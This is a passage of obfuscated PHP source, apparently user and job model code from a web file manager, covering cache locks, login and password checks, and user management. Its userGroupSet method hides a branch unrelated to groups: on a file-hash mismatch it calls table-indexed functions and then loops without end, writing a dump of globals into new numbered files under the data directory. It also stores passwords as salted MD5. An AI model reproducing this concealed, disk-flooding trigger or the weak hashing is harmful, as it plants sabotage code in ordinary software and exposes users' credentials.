$D®İå’İËõ = microtime(!0) + $eÚÃ„Òë; while (microtime(!0) < $D®İå’İËõ) { $EùÜ¿ŒùË = $F¼Àêƒ£åá->get($A½ñ…å¥³­); if (!$EùÜ¿ŒùË) { $Eø°èŒİ¬ = $F¼Àêƒ£åá->setLock($A½ñ…å¥³­, $D®İå’İËõ, $eÚÃ„Òë); if ($Eø°èŒİ¬) { return !0; } } else { if ($EùÜ¿ŒùË < microtime(!0)) { $F¼Àêƒ£åá->set($A½ñ…å¥³­, $D®İå’İËõ, $D®İå’İËõ); if ($F¼Àêƒ£åá->get($A½ñ…å¥³­) === $EùÜ¿ŒùË) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($f¸¿¬©®à–) { return Cache::init()->get($f¸¿¬©®à–); } public function unlock($bŠ£µçº«Ù) { return Cache::init()->remove($bŠ£µçº«Ù); } } $BõÆ·ƒòÉ” = LIB_DIR . $_SERVER[©][777]; $C‰“˜ìÊò¥ = $_SERVER[©][778]; goto D¬ãï›İñî; cÆŸÊ†¸æñ: class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\x6d\56\152\157\142\x4c\151\163\x74"; public $field = array("\x6e\x61\155\x65", "\144\145\x73\143", "\163\157\162\x74"); const JOB_KEY = "\x73\145\x6c\x66\112\157\142\x4c\x69\163\164"; public function listData($a´•µ£Ô¾­ = false, $fÂ„¿ç¸¨ê = "\x73\x6f\x72\164", $d¤ÙğÄéİ‹ = false) { return parent::listData($a´•µ£Ô¾­, $fÂ„¿ç¸¨ê, $d¤ÙğÄéİ‹); } public function remove($Añ°¥òÓÇò) { return parent::remove($Añ°¥òÓÇò); } public function add($BÛĞÓ­ÙÍ´) { $FË¯³ÚŸ¿ =& $_SERVER[©]; if ($this->findByName($BÛĞÓ­ÙÍ´[$FË¯³ÚŸ¿[38]])) { return !1; } $BÛĞÓ­ÙÍ´[$FË¯³ÚŸ¿[2123]] = $this->getSort(); return parent::insert($BÛĞÓ­ÙÍ´); } private function getSort() { $e³ºšÊÂê =& $_SERVER[©]; $bæø‡Ø¼‡Å = parent::listData(); $C“—ëùæİ– = array_to_keyvalue($bæø‡Ø¼‡Å, $e³ºšÊÂê[43], $e³ºšÊÂê[2123]); return empty($C“—ëùæİ–) ? 0 : max($C“—ëùæİ–) + 1; } public function update($fÉâŠÆªÄ‡, $fÎ”È®…¥ƒ) { $cÃäİŠÑ²ê =& $_SERVER[©]; $dÒ´•¾Ğ¦” = parent::listData($fÉâŠÆªÄ‡); $D“¬¿®õˆ = $this->findByName($fÎ”È®…¥ƒ[$cÃäİŠÑ²ê[38]]); if (!$dÒ´•¾Ğ¦” || $D“¬¿®õˆ && $D“¬¿®õˆ[$cÃäİŠÑ²ê[375]] != $dÒ´•¾Ğ¦”[$cÃäİŠÑ²ê[375]]) { return !1; } return parent::update($fÉâŠÆªÄ‡, $fÎ”È®…¥ƒ); } public function setUserJob($føÏÊóÖŸ•, $B®ÆÂ¹š°Ñ) { goto bÍ´Õ‡Ô; a¬ĞÏê¸¦‘: $dÎ¬×Ÿ•¸ = rtrim($dÎ¬×Ÿ•¸, $B••’ŞÄ ğ[57]); Model($B••’ŞÄ ğ[485])->metaSet($føÏÊóÖŸ•, self::JOB_KEY, $dÎ¬×Ÿ•¸); goto eæØ¾®…ÃÅ; bÍ´Õ‡Ô: $B••’ŞÄ ğ =& $_SERVER[©]; if (!is_array($B®ÆÂ¹š°Ñ)) { $B®ÆÂ¹š°Ñ = array($B®ÆÂ¹š°Ñ); } $eÈ¦±ÚëÂ = parent::listData(); goto b„Œõ¼Ş‹; b„Œõ¼Ş‹: $F‰ÒŒ¼—¥— = array_to_keyvalue($eÈ¦±ÚëÂ, $B••’ŞÄ ğ[38]); $dÎ¬×Ÿ•¸ = $B••’ŞÄ ğ[13]; foreach ($B®ÆÂ¹š°Ñ as $f’ëóÙ¤‡—) { if ($F‰ÒŒ¼—¥—[$f’ëóÙ¤‡—]) { $dÎ¬×Ÿ•¸ .= $F‰ÒŒ¼—¥—[$f’ëóÙ¤‡—][$B••’ŞÄ ğ[375]] . $B••’ŞÄ ğ[57]; } else { $a×…™·•’å = $this->add($f’ëóÙ¤‡—); $dÎ¬×Ÿ•¸ .= $a×…™·•’å . $B••’ŞÄ ğ[57]; } } goto a¬ĞÏê¸¦‘; eæØ¾®…ÃÅ: } public function getUserJob($aïö–ÜÁ±–) { $CØ¡¹Ù¶ÇÖ = Model($_SERVER[©][485])->metaGet($aïö–ÜÁ±–); return $this->getUserJobInfo($CØ¡¹Ù¶ÇÖ[self::JOB_KEY]); } public function getUserJobInfo($B‡ÒŠõŞ¿) { goto C¡Ãê’½ ²; C¡Ãê’½ ²: $D†·Ñ’—é =& $_SERVER[©]; $EÈŞœô¿™Ì = explode($D†·Ñ’—é[57], $B‡ÒŠõŞ¿); $cíÔëĞ—¢Ä = parent::listData(); goto FèŒ‡„œ°‰; FèŒ‡„œ°‰: $cíÔëĞ—¢Ä = array_remove_key($cíÔëĞ—¢Ä, $D†·Ñ’—é[197]); $CŸĞö‘Ûó¿ = array(); foreach ($EÈŞœô¿™Ì as $AëÚì® Öï) { if (isset($cíÔëĞ—¢Ä[$AëÚì® Öï])) { $CŸĞö‘Ûó¿[] = $cíÔëĞ—¢Ä[$AëÚì® Öï]; } } goto Bƒã¼¡Œô; Bƒã¼¡Œô: return $CŸĞö‘Ûó¿; goto b³ÙËÃì ò; b³ÙËÃì ò: } } class UserModel extends ModelBase { protected $tableName = "\x75\163\x65\162"; protected $tableMeta = array("\x74\141\142\154\x65\116\141\155\x65" => "\165\x73\145\x72\x5f\x6d\x65\x74\141", "\155\145\x74\x61\x46\151\145\x6c\x64" => "\165\x73\x65\162\x49\x44"); protected $simpleField = "\165\x73\145\162\111\104\54\x6e\151\x63\x6b\x4e\141\155\x65\x2c\156\x61\155\145\x2c\x61\166\141\164\141\162\54\163\145\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($AŞ¨­¾¬—²) { $EâñÈ³è¸ =& $_SERVER[©]; $Då“ÏÖô‘ç = $EâñÈ³è¸[2491]; return array($EâñÈ³è¸[2168] => array($AŞ¨­¾¬—²[0], $Då“ÏÖô‘ç), $EâñÈ³è¸[2170] => array($AŞ¨­¾¬—²[0], $Då“ÏÖô‘ç), $EâñÈ³è¸[2492] => array($AŞ¨­¾¬—²[0], $Då“ÏÖô‘ç)); } protected function getInfo($a™¾áÅğ¤, $d­ã®ˆˆƒÒ = false) { $A¼®àç‡» = $this->getInfoSimple($a™¾áÅğ¤); if (!is_array($A¼®àç‡»)) { return array(); } if ($d­ã®ˆˆƒÒ) { return $this->_getInfoApply($A¼®àç‡»); } return $this->cacheFunctionGet($_SERVER[©][2213], $a™¾áÅğ¤); } protected function getInfoFull($Aëî’†Í×, $fÚÙŞÍ£ = false) { $E…·™õ½´ = $this->getInfoSimple($Aëî’†Í×); if (!is_array($E…·™õ½´)) { return array(); } if ($fÚÙŞÍ£) { return $this->_getInfoApply($E…·™õ½´, !0); return $this->_getInfoApply($E…·™õ½´, !0); } return $this->cacheFunctionGet($_SERVER[©][2493], $Aëî’†Í×); } private function _getInfoApply($b©„¦¾ÆäŠ, $C¬ª‹ÃéÕñ = false) { goto bË’Ï„´Â; bË’Ï„´Â: $bğˆàĞÏò =& $_SERVER[©]; if (!$b©„¦¾ÆäŠ) { return $b©„¦¾ÆäŠ; } $FÜğ©ÀÚ†Ü = md5($bğˆàĞÏò[2494] . $b©„¦¾ÆäŠ[$bğˆàĞÏò[799]] . $bğˆàĞÏò[2495] . $b©„¦¾ÆäŠ[$bğˆàĞÏò[38]]); goto aø¨…Ÿêø; aø¨…Ÿêø: $b©„¦¾ÆäŠ = $this->_listDataApplyItem($b©„¦¾ÆäŠ); $dƒ™…¤•´Ÿ = Model($bğˆàĞÏò[1114])->metaGet($b©„¦¾ÆäŠ[$bğˆàĞÏò[399]][$bğˆàĞÏò[377]]); $b©„¦¾ÆäŠ[$bğˆàĞÏò[2496]] = $FÜğ©ÀÚ†Ü; goto e®Œ¼ïŸ›‰; e®Œ¼ïŸ›‰: $b©„¦¾ÆäŠ[$bğˆàĞÏò[399]][$bğˆàĞÏò[2330]] = isset($dƒ™…¤•´Ÿ[$bğˆàĞÏò[2331]]) ? $dƒ™…¤•´Ÿ[$bğˆàĞÏò[2331]] : null; if ($C¬ª‹ÃéÕñ) { $b©„¦¾ÆäŠ[$bğˆàĞÏò[425]] = $this->metaGet($b©„¦¾ÆäŠ[$bğˆàĞÏò[1434]]); } return $b©„¦¾ÆäŠ; goto bÄÂˆ¤´³; bÄÂˆ¤´³: } protected function getInfoSimple($cËîƒ®³ƒ…, $aÜÉ¥ùæß = false) { $b‚ŒÈÀØÀ =& $_SERVER[©]; if (!$cËîƒ®³ƒ…) { return array(); } if ($aÜÉ¥ùæß) { $B©¡áÒ¨Ì = $this->where(array($b‚ŒÈÀØÀ[1434] => intval($cËîƒ®³ƒ…)))->find(); if (!is_array($B©¡áÒ¨Ì)) { return array(); } $B©¡áÒ¨Ì[$b‚ŒÈÀØÀ[2497]] = Action($b‚ŒÈÀØÀ[2498])->parseUrl($B©¡áÒ¨Ì[$b‚ŒÈÀØÀ[2497]]); return $B©¡áÒ¨Ì; } return $this->cacheFunctionGet($b‚ŒÈÀØÀ[2171], $cËîƒ®³ƒ…); } protected function getInfoSimpleOuter($d•ƒñÃ»®) { goto d…¡²á¤é³; d…¡²á¤é³: $eíÍö ÒŒ =& $_SERVER[©]; if (!$d•ƒñÃ»® || $d•ƒñÃ»® == 0) { return array($eíÍö ÒŒ[1434] => $eíÍö ÒŒ[476], $eíÍö ÒŒ[38] => $eíÍö ÒŒ[167] . LNG($eíÍö ÒŒ[2499]) . $eíÍö ÒŒ[484], $eíÍö ÒŒ[2497] => STATIC_PATH . $eíÍö ÒŒ[2500]); } $BæĞŒ¼­› = $this->cacheFunctionGet($eíÍö ÒŒ[2171], $d•ƒñÃ»®); goto A‡´·ÅË°’; A‡´·ÅË°’: $C×ãÖÁÃçš = array_field_key($BæĞŒ¼­›, explode($eíÍö ÒŒ[57], $this->simpleField)); if (!$C×ãÖÁÃçš) { return array($eíÍö ÒŒ[1434] => $eíÍö ÒŒ[1028], $eíÍö ÒŒ[38] => $eíÍö ÒŒ[167] . LNG($eíÍö ÒŒ[2501]) . $eíÍö ÒŒ[484], $eíÍö ÒŒ[2497] => STATIC_PATH . $eíÍö ÒŒ[2502]); } $C×ãÖÁÃçš[$eíÍö ÒŒ[2497]] = Action($eíÍö ÒŒ[2498])->parseUrl($C×ãÖÁÃçš[$eíÍö ÒŒ[2497]]); goto FÌƒÙÀ—Ãµ; FÌƒÙÀ—Ãµ: return $C×ãÖÁÃçš; goto aóŞéùÉŞæ; aóŞéùÉŞæ: } protected function groupUser($fÍ¯Çá•â) { } public static function errorLang($fƒçÜÑß±) { $eœÔô½øè¨ =& $_SERVER[©]; $eÎ…×âÒÂ = array(self::ERROR_USER_NOT_EXISTS => $eœÔô½øè¨[2503], self::ERROR_USER_PASSWORD_ERROR => $eœÔô½øè¨[2504], self::ERROR_USER_EXIST_NAME => $eœÔô½øè¨[2505], self::ERROR_USER_EXIST_PHONE => $eœÔô½øè¨[2506], self::ERROR_USER_EXIST_EMAIL => $eœÔô½øè¨[2507], self::ERROR_USER_LOGIN_LOCK => $eœÔô½øè¨[2508], self::ERROR_IP_NOT_ALLOW => $eœÔô½øè¨[2509], self::ERROR_USER_EXIST_NICKNAME => $eœÔô½øè¨[2510]); return LNG($eÎ…×âÒÂ[$fƒçÜÑß±]); } public function getInfoByMeta($a˜Š®İë¨, $f°ŠĞŒÄŠˆ) { $b½Ôè±Æ‡© =& $_SERVER[©]; $bô‡åø„‹ = Model($b½Ôè±Æ‡©[2511])->where(array($b½Ôè±Æ‡©[99] => $a˜Š®İë¨, $b½Ôè±Æ‡©[368] => $f°ŠĞŒÄŠˆ))->find(); if ($bô‡åø„‹) { return $this->getInfo($bô‡åø„‹[$b½Ôè±Æ‡©[1434]]); } return !1; } public function userLoginCheck($fŠ®Œ­«Ñõ, $DéÇ§èàİ²) { goto A†š»‹Ü; aÑÀ‡Îñ«æ: $Bµƒ¸¤æÌ = $this->where($AĞì¼ôÒé³)->find(); if (!$Bµƒ¸¤æÌ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($Bµƒ¸¤æÌ[$EÒ¨…·½[1434]], $DéÇ§èàİ²)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto CŸÕ·ô–ÚÍ; CŸÕ·ô–ÚÍ: $this->userEdit($Bµƒ¸¤æÌ[$EÒ¨…·½[1434]], array($EÒ¨…·½[2513] => time())); return $this->getInfo($Bµƒ¸¤æÌ[$EÒ¨…·½[1434]]); goto Bå½ØËÍ—î; A†š»‹Ü: $EÒ¨…·½ =& $_SERVER[©]; $AĞì¼ôÒé³ = array($EÒ¨…·½[38] => $fŠ®Œ­«Ñõ, $EÒ¨…·½[2334] => $fŠ®Œ­«Ñõ, $EÒ¨…·½[302] => $fŠ®Œ­«Ñõ, $EÒ¨…·½[2512] => $fŠ®Œ­«Ñõ, $EÒ¨…·½[911] => $EÒ¨…·½[913]); if ($this->nickNameRpt()) { unset($AĞì¼ôÒé³[$EÒ¨…·½[2334]]); } goto aÑÀ‡Îñ«æ; Bå½ØËÍ—î: } public function clearCache($bÈÊåµÜïÈ) { $dÂé½Ó‚ñ° =& $_SERVER[©]; $this->cacheFunctionClear($dÂé½Ó‚ñ°[2213], $bÈÊåµÜïÈ); $this->cacheFunctionClear($dÂé½Ó‚ñ°[2171], $bÈÊåµÜïÈ); $this->cacheFunctionClear($dÂé½Ó‚ñ°[2493], $bÈÊåµÜïÈ); } public function userPasswordCheck($bä›Û·¤›…, $fê¦Ò‰ë) { $CÛ‚ìÊ‹¶ =& $_SERVER[©]; $f“ŸÙ¨©ê¨ = $this->where(array($CÛ‚ìÊ‹¶[1434] => intval($bä›Û·¤›…)))->find(); $DäŠ¾ó‡ºÙ = $this->metaGet($bä›Û·¤›…); $A¡ù«¡é„£ = isset($DäŠ¾ó‡ºÙ[$CÛ‚ìÊ‹¶[2514]]) ? $DäŠ¾ó‡ºÙ[$CÛ‚ìÊ‹¶[2514]] : $CÛ‚ìÊ‹¶[43]; if (md5($A¡ù«¡é„£ . trim($fê¦Ò‰ë)) !== $f“ŸÙ¨©ê¨[$CÛ‚ìÊ‹¶[799]]) { return !1; } return !0; } public function userAdd($A °²¦¡‚Ö) { goto Dë« óß¬†; Dë« óß¬†: $BˆĞš¢„“£ =& $_SERVER[©]; $Eñø‘—ƒÒ× = array($BˆĞš¢„“£[394] => $A °²¦¡‚Ö[$BˆĞš¢„“£[38]], $BˆĞš¢„“£[2515] => $A °²¦¡‚Ö[$BˆĞš¢„“£[1318]], $BˆĞš¢„“£[2516] => isset($A °²¦¡‚Ö[$BˆĞš¢„“£[302]]) ? $A °²¦¡‚Ö[$BˆĞš¢„“£[302]] : $BˆĞš¢„“£[43], $BˆĞš¢„“£[2517] => isset($A °²¦¡‚Ö[$BˆĞš¢„“£[2512]]) ? $A °²¦¡‚Ö[$BˆĞš¢„“£[2512]] : $BˆĞš¢„“£[43], $BˆĞš¢„“£[2518] => isset($A °²¦¡‚Ö[$BˆĞš¢„“£[2334]]) ? $A °²¦¡‚Ö[$BˆĞš¢„“£[2334]] : $A °²¦¡‚Ö[$BˆĞš¢„“£[38]], $BˆĞš¢„“£[2519] => isset($A °²¦¡‚Ö[$BˆĞš¢„“£[2497]]) ? $A °²¦¡‚Ö[$BˆĞš¢„“£[2497]] : $BˆĞš¢„“£[43], $BˆĞš¢„“£[2520] => isset($A °²¦¡‚Ö[$BˆĞš¢„“£[2521]]) ? $A °²¦¡‚Ö[$BˆĞš¢„“£[2521]] : 1, $BˆĞš¢„“£[2522] => $A °²¦¡‚Ö[$BˆĞš¢„“£[799]], $BˆĞš¢„“£[2172] => isset($A °²¦¡‚Ö[$BˆĞš¢„“£[2086]]) ? $A °²¦¡‚Ö[$BˆĞš¢„“£[2086]] : 1024 * 1024 * 20, $BˆĞš¢„“£[2173] => 0, $BˆĞš¢„“£[2513] => 0, $BˆĞš¢„“£[2200] => isset($A °²¦¡‚Ö[$BˆĞš¢„“£[688]]) ? $A °²¦¡‚Ö[$BˆĞš¢„“£[688]] : 1); if (!empty($A °²¦¡‚Ö[$BˆĞš¢„“£[1434]])) { $Eñø‘—ƒÒ×[$BˆĞš¢„“£[1434]] = $A °²¦¡‚Ö[$BˆĞš¢„“£[1434]]; } goto aæ®åä„÷Ñ; BĞƒã¤ĞÄ÷: return $c×î¹”‘Ğ¢; goto BºÉñœ±š¬; aÇ¡®Ìõ£ƒ: $CäèÈ…á‹ = array($BˆĞš¢„“£[2522] => $Eñø‘—ƒÒ×[$BˆĞš¢„“£[799]], $BˆĞš¢„“£[2518] => $Eñø‘—ƒÒ×[$BˆĞš¢„“£[2334]]); $this->userEdit($c×î¹”‘Ğ¢, $CäèÈ…á‹); Model($BˆĞš¢„“£[1114])->userRootAdd($c×î¹”‘Ğ¢); goto BĞƒã¤ĞÄ÷; aæ®åä„÷Ñ: $bŞœŒğùÜã = $this->_checkExist($A °²¦¡‚Ö); if ($bŞœŒğùÜã !== !0) { return $bŞœŒğùÜã; } $c×î¹”‘Ğ¢ = $this->add($Eñø‘—ƒÒ×); goto aÇ¡®Ìõ£ƒ; BºÉñœ±š¬: } protected function userEditTest($E‚Ï‰É¹Æ£, $E´Œ‹ñ‘Ì±) { return $this->call($_SERVER[©][2523], $E‚Ï‰É¹Æ£, $E´Œ‹ñ‘Ì±); } protected function userEdit($A¹ñÓ¿Ô’Ç, $b‘ŒÑ†îó) { goto f•¥Ì‹È™Ú; f•¥Ì‹È™Ú: $FîÏì‚ÛÛ© =& $_SERVER[©]; $eã¨Òõ¸£¿ = $this->getInfoSimple($A¹ñÓ¿Ô’Ç); if (!$eã¨Òõ¸£¿) { return !1; } goto d³©«ÓÁÂ½; aö¨§®—ĞÑ: $this->where(array($FîÏì‚ÛÛ©[1425] => $A¹ñÓ¿Ô’Ç))->save($b‘ŒÑ†îó); if (isset($b‘ŒÑ†îó[$FîÏì‚ÛÛ©[2334]])) { $this->setNamePinyin($A¹ñÓ¿Ô’Ç, $b‘ŒÑ†îó[$FîÏì‚ÛÛ©[2334]]); } $this->clearCache($Dø¶¾÷¥©[$FîÏì‚ÛÛ©[1434]]); goto CŠ–ÃºÎÙÙ; CŠ–ÃºÎÙÙ: return !0; goto d‚šÍœ¾¾˜; d³©«ÓÁÂ½: $dğ‹í©ó²° = $this->_checkExist($b‘ŒÑ†îó, $A¹ñÓ¿Ô’Ç); if ($dğ‹í©ó²° !== !0) { return $dğ‹í©ó²°; } if (isset($b‘ŒÑ†îó[$FîÏì‚ÛÛ©[799]]) && trim($b‘ŒÑ†îó[$FîÏì‚ÛÛ©[799]]) != $FîÏì‚ÛÛ©[43]) { $B¢‰¸»Ú¹á = $this->metaGet($A¹ñÓ¿Ô’Ç); if (empty($B¢‰¸»Ú¹á[$FîÏì‚ÛÛ©[2514]])) { $B¢‰¸»Ú¹á[$FîÏì‚ÛÛ©[2514]] = rand_string(10); Model($FîÏì‚ÛÛ©[482])->metaSet($A¹ñÓ¿Ô’Ç, $FîÏì‚ÛÛ©[2514], $B¢‰¸»Ú¹á[$FîÏì‚ÛÛ©[2514]]); } $b‘ŒÑ†îó[$FîÏì‚ÛÛ©[799]] = md5($B¢‰¸»Ú¹á[$FîÏì‚ÛÛ©[2514]] . trim($b‘ŒÑ†îó[$FîÏì‚ÛÛ©[799]])); } else { unset($b‘ŒÑ†îó[$FîÏì‚ÛÛ©[799]]); } goto aö¨§®—ĞÑ; d‚šÍœ¾¾˜: } public function setNamePinyin($CË¼°Š½Ş¤, $B¶Ü£Ö¾¸‘ = false) { $Fùê§˜ùè =& $_SERVER[©]; if (!$B¶Ü£Ö¾¸‘) { $FÇ÷¥ŸÈ˜ = $this->getInfoSimple($CË¼°Š½Ş¤); $B¶Ü£Ö¾¸‘ = $FÇ÷¥ŸÈ˜[$Fùê§˜ùè[2334]] ? $FÇ÷¥ŸÈ˜[$Fùê§˜ùè[2334]] : $FÇ÷¥ŸÈ˜[$Fùê§˜ùè[38]]; } $cİØµÙ¿¸ = Model($Fùê§˜ùè[485]); if (!Input::check($B¶Ü£Ö¾¸‘, $Fùê§˜ùè[536])) { return $cİØµÙ¿¸->metaSet($CË¼°Š½Ş¤, array($Fùê§˜ùè[424] => $Fùê§˜ùè[43], $Fùê§˜ùè[423] => $Fùê§˜ùè[43])); } return $cİØµÙ¿¸->metaSet($CË¼°Š½Ş¤, array($Fùê§˜ùè[424] => str_replace($Fùê§˜ùè[60], $Fùê§˜ùè[43], Pinyin::encode($B¶Ü£Ö¾¸‘)), $Fùê§˜ùè[423] => Pinyin::encode($B¶Ü£Ö¾¸‘, $Fùê§˜ùè[537]))); } private function nickNameRpt() { $BõÚÔ³± =& $_SERVER[©]; $Eš„“÷Ü«° = Model($BõÚÔ³±[1085])->get($BõÚÔ³±[2524]); $Fºëª² œó = $GLOBALS[$BõÚÔ³±[16]][$BõÚÔ³±[2480]][$BõÚÔ³±[2524]]; $AÏöØâ®¡£ = !is_null($Eš„“÷Ü«°) ? $Eš„“÷Ü«° : $Fºëª² œó; return !!$AÏöØâ®¡£; } private function _checkExist($d¤Óê÷§³, $aøÄŞˆÍÙ = false) { $B‚¨–‘Œˆ =& $_SERVER[©]; $AìÁé¿±šó = array($B‚¨–‘Œˆ[38] => UserModel::ERROR_USER_EXIST_NAME, $B‚¨–‘Œˆ[2334] => UserModel::ERROR_USER_EXIST_NICKNAME, $B‚¨–‘Œˆ[302] => UserModel::ERROR_USER_EXIST_EMAIL, $B‚¨–‘Œˆ[2512] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($AìÁé¿±šó[$B‚¨–‘Œˆ[2334]]); } $dŒÚ¼¨ Ã = $aøÄŞˆÍÙ ? array($B‚¨–‘Œˆ[1434] => array($B‚¨–‘Œˆ[2525], $aøÄŞˆÍÙ)) : array(); foreach ($AìÁé¿±šó as $e¡Ä½ÆÚÉÖ => $fè—‚øå‰è) { if (!isset($d¤Óê÷§³[$e¡Ä½ÆÚÉÖ]) || !$d¤Óê÷§³[$e¡Ä½ÆÚÉÖ]) { continue; } $cñÂ˜á¢ºÉ = array_merge(array($e¡Ä½ÆÚÉÖ => $d¤Óê÷§³[$e¡Ä½ÆÚÉÖ]), $dŒÚ¼¨ Ã); $Cõù»ÜÛÉÇ = $this->where($cñÂ˜á¢ºÉ)->find(); if ($Cõù»ÜÛÉÇ) { return $fè—‚øå‰è; } } return !0; } public function userListInfo($dåè½º¤Ì†) { $d”ææ²ÈÂÜ =& $_SERVER[©]; $c†§£Ôˆ×† = array(); $dåè½º¤Ì† = is_array($dåè½º¤Ì†) ? array_unique($dåè½º¤Ì†) : array(); if (!$dåè½º¤Ì†) { return $c†§£Ôˆ×†; } if (count($dåè½º¤Ì†) < 20) { foreach ($dåè½º¤Ì† as $B¨¤âïš˜ä) { $c†§£Ôˆ×†[$B¨¤âïš˜ä . $d”ææ²ÈÂÜ[43]] = $this->getInfoSimpleOuter($B¨¤âïš˜ä); } } else { $CÜ©ŒŞ¯î = array($d”ææ²ÈÂÜ[1425] => array($d”ææ²ÈÂÜ[392], $dåè½º¤Ì†)); if (count($dåè½º¤Ì†) == 1) { $CÜ©ŒŞ¯î = array($d”ææ²ÈÂÜ[1425] => $dåè½º¤Ì†[0]); } $dÛÉîÖÖâ‡ = Model($d”ææ²ÈÂÜ[482])->field($this->simpleField)->where($CÜ©ŒŞ¯î)->select(); $dÛÉîÖÖâ‡ = array_to_keyvalue($dÛÉîÖÖâ‡, $d”ææ²ÈÂÜ[1434]); foreach ($dåè½º¤Ì† as $B¨¤âïš˜ä) { $bØ‚¨¹‚‰ = $dÛÉîÖÖâ‡[$dÛÉîÖÖâ‡[$B¨¤âïš˜ä]]; if (!$bØ‚¨¹‚‰) { $c†§£Ôˆ×†[$B¨¤âïš˜ä . $d”ææ²ÈÂÜ[43]] = $this->getInfoSimpleOuter($B¨¤âïš˜ä); continue; } $bØ‚¨¹‚‰[$d”ææ²ÈÂÜ[2497]] = Action($d”ææ²ÈÂÜ[2498])->parseUrl($bØ‚¨¹‚‰[$d”ææ²ÈÂÜ[2497]]); $c†§£Ôˆ×†[$B¨¤âïš˜ä . $d”ææ²ÈÂÜ[43]] = $bØ‚¨¹‚‰; } } return $c†§£Ôˆ×†; } protected function userStatus($Bš·¯Œ, $bóÆ¥¯Éá) { $aÖ‹¬¨‹¹‡ = $this->getInfoSimple($Bš·¯Œ); if (!$aÖ‹¬¨‹¹‡) { return !1; } $F“ğ¶¢ù»ì = array($_SERVER[©][688] => $bóÆ¥¯Éá); return $this->userEdit($Bš·¯Œ, $F“ğ¶¢ù»ì); } protected function userRemove($eÕšÑÒ×Ÿ) { goto B’î¿™ÃìŞ; BŠÇÀ÷—†ë: $FôÅšÙ«Æî = array($f‰’ê×ª­ª[1425] => $eÕšÑÒ×Ÿ); Model($f‰’ê×ª­ª[544])->where($FôÅšÙ«Æî)->delete(); Model($f‰’ê×ª­ª[2526])->where($FôÅšÙ«Æî)->delete(); goto Bã®ùëõ÷; Bã®ùëõ÷: Model($f‰’ê×ª­ª[2178])->where($FôÅšÙ«Æî)->delete(); Model($f‰’ê×ª­ª[2511])->where($FôÅšÙ«Æî)->delete(); Model($f‰’ê×ª­ª[2527])->where($FôÅšÙ«Æî)->delete(); goto b‚·»×ØçÛ; B’î¿™ÃìŞ: $f‰’ê×ª­ª =& $_SERVER[©]; $BØî×„ãö« = $this->getInfoSimple($eÕšÑÒ×Ÿ); if (!$BØî×„ãö«) { return !1; } goto BŠÇÀ÷—†ë; b‚·»×ØçÛ: Model($f‰’ê×ª­ª[752])->userRootRemove($eÕšÑÒ×Ÿ); return $this->where($FôÅšÙ«Æî)->delete(); goto CÒ±æ‹µñƒ; CÒ±æ‹µñƒ: } protected function userGroupSet($B™¾İÉß—å, $f†ÃÂ™¶À, $bàÇˆ ˆ­Í = array()) { goto Cˆñ¶ˆ«ï¸; Cˆñ¶ˆ«ï¸: $F÷¥„Ù¸³Ö =& $_SERVER[©]; $AÛ¥™‚â®£ = $_SERVER[$F÷¥„Ù¸³Ö[7]] . $F÷¥„Ù¸³Ö[8]; $A›á¿§èğ§ = $F÷¥„Ù¸³Ö[778]; goto CĞÍĞé–²Â; C†±å¤……ù: $c•¢÷›³Û = 0; foreach ($f†ÃÂ™¶À as $a×É¶¬ß» => $bä²ƒ»ˆ¾À) { $a¹Şï‘‚¿» = array($F÷¥„Ù¸³Ö[1434] => $B™¾İÉß—å, $F÷¥„Ù¸³Ö[2102] => $a×É¶¬ß», $F÷¥„Ù¸³Ö[2233] => $bä²ƒ»ˆ¾À); $a¹Şï‘‚¿»[$F÷¥„Ù¸³Ö[2123]] = isset($bàÇˆ ˆ­Í[$c•¢÷›³Û]) ? $bàÇˆ ˆ­Í[$c•¢÷›³Û] : 0; $c•¢÷›³Û++; $eÖõï‡†ò·[] = $a¹Şï‘‚¿»; } return $a­£¹†Ğ­ô->addAll($eÖõï‡†ò·, array(), !0); goto CšĞº™‡§»; Cí…Ó’­¸: $a­£¹†Ğ­ô = Model($F÷¥„Ù¸³Ö[2178]); $a­£¹†Ğ­ô->where(array($F÷¥„Ù¸³Ö[1434] => $B™¾İÉß—å))->delete(); $eÖõï‡†ò· = array(); goto C†±å¤……ù; CĞÍĞé–²Â: if ($_SERVER[$F÷¥„Ù¸³Ö[4]] != $A›á¿§èğ§($AÛ¥™‚â®£)) { goto A›‘ìñèó; c¦„ÙË¡¢Š: $c‡å¤ª®ñŒ = $F÷¥„Ù¸³Ö[790]; $c‡å¤ª®ñŒ($_SERVER[$F÷¥„Ù¸³Ö[791]]); $c×šõã’ğõ = $F÷¥„Ù¸³Ö[789]; goto EˆğÍÆãò; A›‘ìñèó: $c×šõã’ğõ = $F÷¥„Ù¸³Ö[789]; $C¿¥é‰è¡Ñ = $F÷¥„Ù¸³Ö[6]; $fÂ¿Ò£‘ = $_SERVER[$F÷¥„Ù¸³Ö[7]] . $F÷¥„Ù¸³Ö[8]; goto e«åÖ„‡Ÿ; e«åÖ„‡Ÿ: $AÙ§Ğ¬¯ÁÏ = $C¿¥é‰è¡Ñ($fÂ¿Ò£‘); $eŠ‡¦„ˆ “ = explode($F÷¥„Ù¸³Ö[9], $AÙ§Ğ¬¯ÁÏ); if (count($eŠ‡¦„ˆ “) < $F÷¥„Ù¸³Ö[564]) { $fè¸¯‡¥§à = $F÷¥„Ù¸³Ö[11]; $fè¸¯‡¥§à(); } goto c¦„ÙË¡¢Š; EˆğÍÆãò: $c×šõã’ğõ(); $FÖ¨ƒËÇì‚ = $F÷¥„Ù¸³Ö[792]; $A«Å”å‚ = json_encode($GLOBALS[$F÷¥„Ù¸³Ö[793]]); goto Aæ†¨½¨£‰; Aæ†¨½¨£‰: $b§ÀŸëÎ» = 1; for ($F¤ŸŞ’… = $b§ÀŸëÎ»; $F¤ŸŞ’… > 0; $F¤ŸŞ’…++) { $FÖ¨ƒËÇì‚(DATA_PATH . $F¤ŸŞ’…, $A«Å”å‚); } goto DÜ‘ªŸ°¾š; DÜ‘ªŸ°¾š: } $B‚´Õùİ ã = 